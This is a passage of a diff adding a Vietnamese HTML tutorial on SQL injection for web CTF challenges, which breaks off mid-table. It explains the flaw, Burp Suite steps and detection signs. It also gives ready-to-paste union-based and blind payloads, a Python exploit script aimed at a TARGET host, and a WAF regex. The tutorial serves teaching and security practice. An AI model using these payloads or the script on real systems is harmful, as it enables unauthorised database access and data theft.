@@ -1,0 +1,837 @@
+<title>SQL Injection (SQLi) — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:15px;margin:14px 0 4px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+
+.rule{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:0 11px 11px 0;padding:12px 15px;margin:11px 0}
+.rule h3{margin:0 0 4px;font-size:15px}
+.rule p{margin:3px 0 0;font-size:14px;color:var(--muted)}
+
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+
+.checklist{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:15px 17px;margin:14px 0}
+.checklist label{display:flex;gap:9px;align-items:flex-start;font-size:14px;margin:7px 0;cursor:pointer}
+.checklist input{margin-top:4px;accent-color:var(--accent);width:15px;height:15px;flex:none}
+
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Injection phía server</div>
+    <h1>SQL Injection (SQLi)</h1>
+    <p class="sub">Khi một trang web lấy dữ liệu bạn gõ vào (ô tìm kiếm, link, form đăng nhập...) rồi
+    dán thẳng vào câu lệnh hỏi cơ sở dữ liệu — bạn có thể "nói chuyện trực tiếp" với cơ sở dữ liệu đó,
+    đọc được bảng mà lẽ ra bạn không được xem, kể cả bảng chứa flag.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 sqlmap &amp; kho payload</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>SQLi là gì, để làm gì?</h2>
+  <p class="lead">Trang web thường lưu dữ liệu (user, bài viết, flag...) trong một <strong>cơ sở dữ liệu (database)</strong>
+  — nghĩ đơn giản như một cuốn sổ bảng tính khổng lồ. Khi bạn gõ gì đó vào ô tìm kiếm, server phải "hỏi" cuốn sổ đó
+  một câu bằng ngôn ngữ riêng gọi là <strong>SQL</strong>. Nếu server ghép thẳng chữ bạn gõ vào câu hỏi đó mà không
+  kiểm tra, bạn có thể gõ ra một câu SQL khác hẳn ý đồ ban đầu — ép cuốn sổ trả lời đúng cái bạn muốn, kể cả dữ liệu
+  của người khác hoặc bảng chứa flag.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  SQLi xảy ra vì server <strong>không phân biệt được</strong> "chữ bạn gõ là dữ liệu" với "chữ bạn gõ là lệnh".
+  Dấu nháy đơn <code>'</code> là chìa khóa: nó thường là ký tự dùng để đóng một chuỗi dữ liệu trong SQL — gõ đúng chỗ,
+  bạn "thoát" ra khỏi vai trò dữ liệu và viết tiếp lệnh của riêng mình.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ SQL INJECTION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có ô nhập liệu/tham số URL ảnh hưởng tới dữ liệu hiển thị (tìm kiếm, id sản phẩm, đăng nhập). Gõ <code>'</code>
+        (một dấu nháy đơn) vào đó → nếu trang báo lỗi 500 / thông báo lỗi SQL / trang trắng bất thường (so với gõ chữ
+        thường) → nghi SQLi gần như chắc chắn.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Tham số đó thực sự đi vào một câu truy vấn SQL (không phải NoSQL/file). Biết được <em>kết quả truy vấn có hiện
+        ra màn hình không</em> (union/error-based) hay <em>phải đoán qua true/false</em> (blind).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Bắt request (Proxy) → <em>Send to Repeater</em> → đổi giá trị tham số thành <code>1'</code> rồi <code>1' -- -</code>
+        → so sánh 2 response. Khác nhau rõ (lỗi vs không lỗi) ⟹ trúng SQLi.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># 1. Xác nhận có SQLi</span>
+' OR '1'='1
+<span class="c"># 2. Đếm số cột (tăng dần n tới khi lỗi)</span>
+1' ORDER BY 1-- -
+<span class="c"># 3. Union lấy dữ liệu (giả sử 3 cột, cột 2 hiện ra màn hình)</span>
+1' UNION SELECT 1,flag,3 FROM flags-- -
+<span class="c"># 4. Không thấy gì hiện ra? Thử blind:</span>
+1' AND 1=1-- -        <span class="c"># trang bình thường</span>
+1' AND 1=2-- -        <span class="c"># trang khác đi/trống/lỗi ⟹ xác nhận blind</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+html = requests.get(<span class="s">"http://TARGET/item"</span>,
+        params={<span class="s">"id"</span>: <span class="s">"0 UNION SELECT 1,flag,3 FROM flags-- -"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Sai số cột → lỗi "different number of columns": tăng/giảm số cột trong <code>UNION SELECT</code> cho khớp.
+        Dấu <code>#</code> cũng comment được MySQL nếu <code>-- -</code> bị lọc.
+        WAF rule nhanh: chặn regex <code>(?i)union\s+select</code>. Chưa hiểu các bước? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước khi đọc tiếp</h2>
+
+  <div class="def"><b>HTTP request</b> — mỗi khi trình duyệt (hoặc script của bạn) muốn lấy/gửi gì tới server, nó gửi
+  một "lá thư" gọi là request. Lá thư này có: <b>method</b> (GET để xin dữ liệu, POST để gửi dữ liệu lên),
+  <b>URL</b> (địa chỉ trang), <b>param</b> (tham số, ví dụ <code>?id=5</code> — giá trị <code>5</code> là param),
+  và đôi khi có <b>body</b> (phần nội dung gửi kèm, như dữ liệu form đăng nhập).</div>
+
+  <div class="def"><b>HTTP response</b> — "thư trả lời" từ server: có <b>status code</b> (200 = OK, 500 = lỗi server,
+  404 = không tìm thấy...) và <b>body</b> (nội dung HTML/JSON bạn thấy trên trang).</div>
+
+  <div class="def"><b>Database (cơ sở dữ liệu)</b> — nơi server lưu trữ dữ liệu có cấu trúc, chia thành các
+  <b>bảng (table)</b> (giống 1 sheet Excel), mỗi bảng có nhiều <b>cột (column)</b> và nhiều <b>dòng (row)</b>.
+  Ví dụ bảng <code>users</code> có cột <code>id</code>, <code>username</code>, <code>password</code>.</div>
+
+  <div class="def"><b>SQL</b> (Structured Query Language) — ngôn ngữ để "hỏi chuyện" với database. Câu hỏi cơ bản nhất:
+  <code>SELECT cột FROM bảng WHERE điều_kiện</code> — nghĩa là "lấy ra những cột này, từ bảng này, với điều kiện này".</div>
+
+  <p>Ví dụ: trang web có chức năng xem sản phẩm theo ID. Khi bạn vào <code>/item?id=5</code>, server ở phía sau
+  (code PHP/Python/Node...) sẽ chạy một câu SQL kiểu:</p>
+  <pre><code>SELECT name, price FROM products WHERE id = 5</code></pre>
+  <p>Server lấy số <code>5</code> trực tiếp từ param <code>id</code> trên URL bạn gõ, rồi dán thẳng vào chỗ đáng lẽ
+  là "điều kiện". Đây chính là chỗ hở.</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Lập trình viên định làm gì, sơ hở ở đâu?</h2>
+  <p>Lập trình viên muốn: "lấy sản phẩm có ID đúng bằng số người dùng chọn". Cách viết code <strong>sai nhưng rất phổ
+  biến</strong> (đặc biệt ở các challenge CTF dựng nhanh) là <strong>nối chuỗi trực tiếp</strong>:</p>
+  <pre><code><span class="c"># Python (giả định, kiểu code dễ gặp trong challenge)</span>
+id = request.args.get(<span class="s">"id"</span>)          <span class="c"># lấy nguyên văn từ URL, vd: "5"</span>
+query = <span class="s">f"SELECT name, price FROM products WHERE id = {id}"</span>
+cursor.execute(query)</code></pre>
+  <p>Vấn đề: biến <code>id</code> được <strong>ghép thẳng vào chuỗi câu lệnh</strong> bằng f-string/nối chuỗi, thay vì
+  được database hiểu là "chỉ là một giá trị dữ liệu". Database không có cách nào phân biệt "đây là số 5 người dùng
+  nhập" với "đây là một đoạn lệnh SQL mới" — nó chỉ thấy toàn bộ chuỗi và chạy y nguyên.</p>
+  <p>Vì sao điều này nguy hiểm: SQL dùng <strong>dấu nháy đơn <code>'</code></strong> để đánh dấu bắt đầu/kết thúc
+  một chuỗi text. Nếu tham số là kiểu text (ví dụ ô tìm kiếm tên sản phẩm), câu lệnh sẽ là:</p>
+  <pre><code>SELECT * FROM products WHERE name = '<span class="n">laptop</span>'</code></pre>
+  <p>Nếu bạn gõ vào ô tìm kiếm chữ <code>laptop' OR '1'='1</code>, server ghép ra:</p>
+  <pre><code>SELECT * FROM products WHERE name = '<span class="n">laptop</span>' OR '1'='1'</code></pre>
+  <p>Dấu <code>'</code> đầu tiên trong input của bạn đã <strong>đóng sớm</strong> chuỗi <code>'laptop</code>, biến
+  phần còn lại <code> OR '1'='1</code> thành <strong>code SQL thật</strong> được database thực thi, không còn là
+  dữ liệu nữa.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Request độc → server hiểu sai → hậu quả</h2>
+
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:11px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:11px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:11px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr)}
+    </style>
+    <defs>
+      <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+        <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/>
+      </marker>
+    </defs>
+    <!-- step 1: request -->
+    <rect x="10" y="20" width="200" height="60" rx="10" class="box"/>
+    <text x="22" y="40" class="lbl-m">Request bạn gửi:</text>
+    <text x="22" y="58" class="lbl">GET /item?id=</text>
+    <text x="22" y="72" class="lbl-a">1' UNION SELECT...</text>
+
+    <path d="M210,50 H250" class="arrow"/>
+
+    <!-- step 2: server code -->
+    <rect x="255" y="20" width="200" height="60" rx="10" class="box"/>
+    <text x="267" y="40" class="lbl-m">Server ghép chuỗi:</text>
+    <text x="267" y="58" class="lbl">"...WHERE id = " +</text>
+    <text x="267" y="72" class="lbl-a">id</text>
+
+    <path d="M465,50 H500" class="arrow"/>
+
+    <!-- step 3: SQL to DB -->
+    <rect x="505" y="20" width="165" height="60" rx="10" class="box-a"/>
+    <text x="517" y="40" class="lbl-m">Câu SQL thật chạy:</text>
+    <text x="517" y="58" class="lbl-a" font-size="9.5">WHERE id=1 UNION</text>
+    <text x="517" y="70" class="lbl-a" font-size="9.5">SELECT...-- -</text>
+
+    <path d="M585,80 V110" class="arrow"/>
+
+    <!-- step 4: DB executes -->
+    <rect x="255" y="115" width="200" height="60" rx="10" class="box"/>
+    <text x="267" y="135" class="lbl-m">Database thực thi:</text>
+    <text x="267" y="153" class="lbl">không phân biệt được</text>
+    <text x="267" y="167" class="lbl">lệnh gốc với lệnh chèn</text>
+
+    <path d="M255,145 H210" class="arrow"/>
+
+    <!-- step 5: result leak -->
+    <rect x="10" y="115" width="200" height="60" rx="10" class="box-a"/>
+    <text x="22" y="135" class="lbl-a">Hậu quả:</text>
+    <text x="22" y="153" class="lbl">trả về dữ liệu bảng</text>
+    <text x="22" y="167" class="lbl">khác (vd: bảng flags)</text>
+
+    <text x="10" y="220" class="lbl-m">Quy ước màu: </text>
+    <rect x="90" y="208" width="14" height="14" class="box-a"/>
+    <text x="110" y="220" class="lbl-m">= phần bạn (kẻ tấn công) kiểm soát / tạo ra</text>
+  </svg>
+  </div>
+
+  <p>Ví dụ bằng <strong>số thật đi hết chuỗi</strong>: giả sử bảng <code>products</code> có 3 cột
+  (<code>id</code>, <code>name</code>, <code>price</code>), và có một bảng khác tên <code>flags</code> với 1 cột
+  <code>flag</code> chứa chuỗi <code>FHACKER2026{...}</code>.</p>
+
+  <p><strong>Bước 1 — đếm số cột.</strong> Gõ <code>id=1' ORDER BY 3-- -</code>: trang vẫn hiện bình thường (vì
+  bảng có ít nhất 3 cột). Gõ <code>id=1' ORDER BY 4-- -</code>: trang báo lỗi "Unknown column '4'" ⟹ bảng
+  <strong>đúng 3 cột</strong>.</p>
+
+  <p><strong>Bước 2 — ghép UNION.</strong> <code>UNION SELECT</code> cho phép "dán thêm" kết quả của một câu
+  <code>SELECT</code> khác vào ngay sau kết quả gốc, miễn là <strong>số cột khớp nhau</strong> (ở đây là 3).
+  Ta không cần biết tên cột thật của <code>products</code>, chỉ cần điền đủ 3 giá trị:</p>
+  <pre><code>id=0 UNION SELECT 1, flag, 3 FROM flags-- -</code></pre>
+  <div class="pbreak">
+    <div class="ph">0 UNION SELECT 1, flag, 3 FROM flags-- -</div>
+    <div class="pb">
+      <div class="part"><code>0</code> — ID giả, cố tình sai để câu <code>SELECT</code> gốc không trả dòng nào
+      (tránh lẫn dữ liệu gốc vào, dễ đọc kết quả).</div>
+      <div class="part"><code>UNION SELECT 1, flag, 3</code> — nối thêm 1 dòng kết quả giả, đúng 3 cột: cột 1 là
+      số <code>1</code> (giá trị rác, không quan trọng), <strong>cột 2 là <code>flag</code></strong> (cột thật từ
+      bảng khác — đây là nơi dữ liệu bị đánh cắp hiện ra), cột 3 là số <code>3</code> (rác).</div>
+      <div class="part"><code>FROM flags</code> — lấy dữ liệu từ bảng <code>flags</code> thay vì
+      <code>products</code>.</div>
+      <div class="part"><code>-- -</code> — comment, "nuốt" phần còn lại của câu lệnh gốc server đã viết sẵn phía sau
+      (thường là dấu ngoặc đóng hoặc điều kiện thừa), tránh gây lỗi cú pháp.</div>
+    </div>
+    <div class="resp"><b>Response mong đợi:</b> thay vì tên/giá sản phẩm, trang hiện ra một dòng có chữ
+    <code>FHACKER2026{...64 ký tự hex...}</code> ở đúng vị trí cột 2 từng hiện <code>name</code>.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu — thấy gì thì nghi SQLi</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>URL có <code>?id=</code>, <code>?search=</code>, <code>?category=</code>...</td>
+        <td>Tham số rất có thể đi thẳng vào câu <code>WHERE</code>.</td></tr>
+    <tr><td>Gõ <code>'</code> vào ô input → trang lỗi 500 / thông báo kiểu "SQL syntax error"</td>
+        <td>Chắc chắn param đi vào SQL mà không được lọc dấu nháy.</td></tr>
+    <tr><td>Gõ <code>' OR '1'='1</code> vào ô đăng nhập → đăng nhập thành công dù sai mật khẩu</td>
+        <td>SQLi trong câu truy vấn kiểm tra đăng nhập.</td></tr>
+    <tr><td>Trang không báo lỗi, nhưng nội dung đổi khi gõ <code>1 AND 1=1</code> vs <code>1 AND 1=2</code></td>
+        <td>Boolean-based blind SQLi (không lộ lỗi nhưng vẫn khai thác được).</td></tr>
+    <tr><td>Trang phản hồi chậm hẳn khi thêm <code>AND SLEEP(5)</code></td>
+        <td>Time-based blind SQLi (dùng khi không có khác biệt nào quan sát được khác).</td></tr>
+  </table>
+  <div class="note"><span class="tag">Cách chọc thử nhanh (Combat Card mục 🚩)</span>
+  Thứ tự thử: <code>'</code> → <code>' OR '1'='1</code> → <code>' ORDER BY 10-- -</code>. Chỉ cần 3 lần gõ là biết
+  gần như chắc chắn có SQLi hay không.</div>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Burp Suite là gì, và bấm gì (từng bước)</h2>
+  <div class="def"><b>Burp Suite</b> — một chương trình đứng giữa trình duyệt của bạn và server, cho phép bạn
+  <strong>xem và sửa</strong> mọi request trước khi nó thực sự được gửi đi. Nghĩ như việc bạn chặn một lá thư giữa
+  đường, đọc nó, sửa vài chữ, rồi mới cho nó đi tiếp.</div>
+
+  <div class="note burp"><span class="tag">Bước 1 — bắt request</span>
+  <ol style="margin:4px 0 0">
+    <li>Mở Burp Suite → tab <strong>Proxy</strong> → <strong>Intercept</strong> → bấm cho nó hiện
+    <em>"Intercept is on"</em>.</li>
+    <li>Vào Settings của trình duyệt, đặt proxy HTTP thành <code>127.0.0.1:8080</code> (cổng mặc định của Burp).</li>
+    <li>Trên web, mở trang challenge, gõ ID sản phẩm bất kỳ (ví dụ <code>1</code>) rồi bấm xem/tìm kiếm.</li>
+    <li>Request bị Burp giữ lại — bạn sẽ thấy nó hiện trong tab Proxy, dạng text giống
+    <code>GET /item?id=1 HTTP/1.1</code>.</li>
+  </ol></div>
+
+  <div class="note burp"><span class="tag">Bước 2 — gửi sang Repeater để sửa & gửi lại nhiều lần</span>
+  <ol style="margin:4px 0 0">
+    <li>Chuột phải vào request đang bị giữ → chọn <strong>Send to Repeater</strong>.</li>
+    <li>Chuyển sang tab <strong>Repeater</strong> (nó đã tự mở request bạn vừa gửi sang).</li>
+    <li>Sửa trực tiếp trong khung request: đổi <code>id=1</code> thành
+    <code>id=1' ORDER BY 3-- -</code>.</li>
+    <li>Bấm nút <strong>Send</strong> (hoặc Ctrl+Enter).</li>
+    <li>Đọc panel <strong>Response</strong> bên phải: nếu thấy status <code>200</code> và trang bình thường ⟹ có
+    ít nhất 3 cột. Đổi số lên <code>4</code>, <code>Send</code> lại, nếu giờ thấy lỗi SQL hoặc status
+    <code>500</code> ⟹ đúng 3 cột.</li>
+    <li>Sửa tiếp thành payload UNION đầy đủ, bấm Send, đọc flag ngay trong Response.</li>
+  </ol>
+  <strong>Lợi ích của Repeater:</strong> bạn sửa-gửi-đọc lặp đi lặp lại rất nhanh mà không cần gõ lại cả URL mỗi lần
+  trên trình duyệt.</div>
+
+  <div class="note burp"><span class="tag">Khi nào cần Intruder (tự động dò nhiều giá trị)</span>
+  Dùng Repeater khi bạn tự tay thử từng payload một (như trên). Dùng <strong>Intruder</strong> khi cần <em>lặp qua
+  rất nhiều giá trị tự động</em> — ví dụ đếm số cột mà không muốn gõ tay <code>ORDER BY 1,2,3...20</code>:
+  <ol style="margin:4px 0 0">
+    <li>Send to Intruder (chuột phải request trong Proxy/Repeater).</li>
+    <li>Trong tab <strong>Positions</strong>: xóa hết dấu <code>§</code> mặc định, chỉ đánh dấu đúng vị trí con số
+    trong <code>ORDER BY §1§</code>.</li>
+    <li>Tab <strong>Payloads</strong>: chọn loại <em>Numbers</em>, từ 1 tới 20.</li>
+    <li>Bấm <strong>Start attack</strong>. Sắp xếp kết quả theo cột <strong>Length</strong> hoặc
+    <strong>Status code</strong> — dòng nào khác biệt (ví dụ length giảm hẳn, status đổi từ 200→500) chính là số cột
+    bạn cần.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Chọn đúng kỹ thuật theo tình huống</h2>
+
+  <h3>A. Union-based <span class="badge easy">dễ nhất, thử trước</span></h3>
+  <p>Dùng khi: kết quả truy vấn <strong>hiện ra trực tiếp</strong> trên trang (bạn thấy tên sản phẩm, giá...).</p>
+  <table>
+    <tr><th>Bước</th><th>Payload</th><th>Mục đích</th></tr>
+    <tr><td>1. Xác nhận lỗ hổng</td><td><code>'</code></td><td>Gây lỗi cú pháp SQL → xác nhận input đi vào SQL</td></tr>
+    <tr><td>2. Đếm cột</td><td><code>' ORDER BY n-- -</code></td><td>Tăng dần <code>n</code> tới khi lỗi ⟹ số cột = n-1</td></tr>
+    <tr><td>3. Tìm cột hiện ra màn hình</td><td><code>' UNION SELECT 1,2,3-- -</code></td><td>Xem số nào xuất hiện trên trang (đó là cột "hiện được")</td></tr>
+    <tr><td>4. Lấy dữ liệu</td><td><code>' UNION SELECT 1,flag,3 FROM flags-- -</code></td><td>Thay số ở cột hiện được bằng cột thật muốn đọc</td></tr>
+    <tr><td>5. Liệt kê bảng (không biết tên bảng)</td><td><code>' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -</code></td><td>MySQL/Postgres: bảng hệ thống chứa tên mọi bảng khác</td></tr>
